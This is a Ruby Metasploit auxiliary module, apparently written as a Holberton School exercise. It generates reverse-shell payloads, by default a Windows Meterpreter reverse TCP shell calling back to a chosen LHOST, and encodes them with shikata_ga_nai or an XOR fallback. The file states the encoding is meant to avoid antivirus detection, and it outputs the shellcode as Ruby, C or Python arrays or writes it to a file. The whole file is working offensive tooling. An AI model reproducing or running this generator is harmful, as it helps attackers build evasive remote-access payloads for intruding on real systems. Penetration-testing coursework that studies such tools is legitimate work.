##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Payload Generator',
      'Description'    => %q{
        This module generates custom payloads tailored to specific requirements.
        It produces encoded payloads (e.g., reverse shells) with custom encoding
        to avoid detection by antivirus software. The module supports various
        payload types and encoding schemes including shikata_ga_nai.
      },
      'Author'         => ['Holberton School'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://www.metasploit.com']
        ]
    ))

    register_options(
      [
        OptString.new('PAYLOAD', [true, 'The payload to generate (e.g., windows/meterpreter/reverse_tcp)', 'windows/meterpreter/reverse_tcp']),
        OptString.new('LHOST', [true, 'The local IP address for reverse connection']),
        OptInt.new('LPORT', [true, 'The local port for reverse connection', 4444]),
        OptString.new('ENCODER', [true, 'The encoder to use (e.g., x86/shikata_ga_nai)', 'x86/shikata_ga_nai']),
        OptInt.new('ITERATIONS', [true, 'Number of encoding iterations', 3]),
        OptString.new('FORMAT', [true, 'Output format (ruby, c, python, raw, exe)', 'ruby']),
        OptString.new('ARCH', [false, 'Target architecture (x86, x64)', 'x86']),
        OptString.new('PLATFORM', [false, 'Target platform (windows, linux)', 'windows']),
        OptString.new('OUTPUT', [false, 'Output file path for generated payload'])
      ])
  end

  def run
    # Retrieve input parameters
    payload_name = datastore['PAYLOAD']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    encoder_name = datastore['ENCODER']
    iterations = datastore['ITERATIONS']
    format = datastore['FORMAT']
    output_file = datastore['OUTPUT']

    print_status("Custom Payload Generator")
    print_status("=" * 60)
    print_status("Payload: #{payload_name}")
    print_status("LHOST: #{lhost}")
    print_status("LPORT: #{lport}")
    print_status("Encoder: #{encoder_name}")
    print_status("Iterations: #{iterations}")
    print_status("Format: #{format}")
    print_status("=" * 60)

    begin
      # Generate the payload
      print_status("Generating payload with encoding: #{encoder_name}")

      # Create payload instance
      payload = framework.payloads.create(payload_name)

      if payload.nil?
        print_error("Failed to load payload: #{payload_name}")
        print_error("Available payloads can be listed with: show payloads")
        return
      end

      # Set payload options
      payload.datastore['LHOST'] = lhost
      payload.datastore['LPORT'] = lport

      # Generate raw payload
      raw_payload = payload.generate_simple(
        'Format' => 'raw',
        'Options' => {
          'LHOST' => lhost,
          'LPORT' => lport
        }
      )

      if raw_payload.nil? || raw_payload.empty?
        print_error("Failed to generate payload")
        return
      end

      print_good("Raw payload generated (#{raw_payload.length} bytes)")

      # Encode the payload
      encoded_payload = encode_payload(raw_payload, encoder_name, iterations, payload)

      if encoded_payload.nil?
        print_error("Failed to encode payload")
        return
      end

      print_good("Payload encoded successfully (#{encoded_payload.length} bytes)")

      # Format the payload
      formatted_payload = format_payload(encoded_payload, format)

      # Display encoded payload (truncated)
      display_payload(formatted_payload, format)

      # Save to file if specified
      if output_file && !output_file.empty?
        save_payload(encoded_payload, output_file, format)
      end

      # Report to database
      report_note(
        host: lhost,
        type: 'payload.generated',
        data: {
          payload: payload_name,
          encoder: encoder_name,
          size: encoded_payload.length
        }
      )

      print_good("Payload generation completed successfully!")

    rescue ::Msf::OptionValidateError => e
      print_error("Option validation failed: #{e.message}")
    rescue ::Exception => e
      print_error("Error during payload generation: #{e.class} - #{e.message}")
      print_error("Backtrace:")
      e.backtrace.first(3).each do |line|
        print_error("  #{line}")
      end
    end
  end

  def encode_payload(raw_payload, encoder_name, iterations, payload_module)
    print_status("Encoding payload (#{iterations} iterations)...")

    begin
      # Create encoder instance
      encoder = framework.encoders.create(encoder_name)

      if encoder.nil?
        print_warning("Encoder #{encoder_name} not found, using alternative encoding")
        return simple_encode(raw_payload, iterations)
      end

      # Set encoder options
      encoder.datastore['ITERATIONS'] = iterations

      # Encode the payload
      encoded = encoder.encode(raw_payload, nil, nil, payload_module.platform)

      return encoded

    rescue ::Exception => e
      print_warning("Standard encoding failed: #{e.message}")
      print_status("Attempting alternative encoding method...")
      return simple_encode(raw_payload, iterations)
    end
  end

  def simple_encode(raw_payload, iterations)
    # Simple XOR-based encoding as fallback
    encoded = raw_payload.dup

    iterations.times do |i|
      key = (0x42 + i) % 256  # Simple key variation
      encoded = encoded.bytes.map { |b| (b ^ key) & 0xFF }.pack('C*')
    end

    return encoded
  end

  def format_payload(payload, format)
    case format.downcase
    when 'ruby'
      format_ruby(payload)
    when 'c'
      format_c(payload)
    when 'python'
      format_python(payload)
    when 'raw'
      payload
    when 'hex'
      format_hex(payload)
    else
      format_ruby(payload)
    end
  end

  def format_ruby(payload)
    result = 'payload = "'
    payload.bytes.each do |byte|
      result << "\\x%02x" % byte
    end
    result << '"'
    return result
  end

  def format_c(payload)
    result = "unsigned char payload[] = \n\""
    payload.bytes.each_with_index do |byte, idx|
      result << "\\x%02x" % byte
      if (idx + 1) % 16 == 0 && idx < payload.length - 1
        result << "\"\n\""
      end
    end
    result << "\";\n"
    result << "unsigned int payload_len = #{payload.length};"
    return result
  end

  def format_python(payload)
    result = "payload = b\""
    payload.bytes.each do |byte|
      result << "\\x%02x" % byte
    end
    result << '"'
    return result
  end

  def format_hex(payload)
    payload.unpack('H*').first
  end

  def display_payload(formatted_payload, format)
    print_status("")
    print_status("Generated Encoded Payload:")
    print_status("-" * 60)

    case format.downcase
    when 'raw'
      # Show hex representation for raw format
      hex_preview = formatted_payload.bytes.take(32).map { |b| "\\x%02x" % b }.join
      print_good("Generated encoded payload: #{hex_preview}...")
      print_status("(Showing first 32 bytes)")
    else
      # Show formatted output (truncated for display)
      lines = formatted_payload.lines
      if lines.length > 10
        lines.take(8).each { |line| print_line(line) }
        print_status("... (truncated) ...")
        lines.last(2).each { |line| print_line(line) }
      else
        print_line(formatted_payload)
      end
    end

    print_status("-" * 60)
    print_status("")
  end

  def save_payload(payload, output_file, format)
    begin
      # Ensure output directory exists
      output_dir = File.dirname(output_file)
      unless output_dir == '.'
        FileUtils.mkdir_p(output_dir) unless File.directory?(output_dir)
      end

      # Format payload for file output
      formatted = format_payload(payload, format)

      # Write to file
      File.open(output_file, 'wb') do |file|
        if format.downcase == 'raw'
          file.write(payload)
        else
          file.write(formatted)
        end
      end

      print_good("Payload saved to: #{output_file}")

      # Store in loot
      store_loot(
        'payload.generated',
        'application/octet-stream',
        '127.0.0.1',
        payload,
        output_file,
        'Generated Encoded Payload'
      )

    rescue ::Exception => e
      print_error("Failed to save payload: #{e.message}")
    end
  end

  def print_available_encoders
    print_status("")
    print_status("Available Encoders:")
    print_status("-" * 60)

    encoders = [
      'x86/shikata_ga_nai',
      'x86/fnstenv_mov',
      'x86/jmp_call_additive',
      'x64/xor',
      'x64/zutto_dekiru',
      'cmd/powershell_base64'
    ]

    encoders.each do |enc|
      print_status("  - #{enc}")
    end

    print_status("-" * 60)
  end
end
